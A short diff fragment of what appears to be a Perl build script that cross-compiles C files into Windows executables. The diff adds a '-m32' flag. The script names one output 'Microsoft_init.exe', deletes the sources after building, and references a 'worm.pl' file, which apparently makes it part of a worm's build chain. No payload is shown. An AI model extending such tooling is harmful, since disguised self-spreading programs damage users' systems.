@@ -113,11 +113,11 @@ HERE
 		$gcc = "i686-w64-mingw32-" . $gcc;
 	  }
 	  if(-e "init.c"){
-	    system("$gcc -o Microsoft_init.exe init.c");
+	    system("$gcc -m32 -o Microsoft_init.exe init.c");
 		unlink "init.c";
 	  }
 	  if(-e "move.c"){
-	    system("$gcc -o Move.exe move.c");
+	    system("$gcc -m32 -o Move.exe move.c");
 	    unlink "move.c";
 	  }
 	  if(-e "worm.pl"){
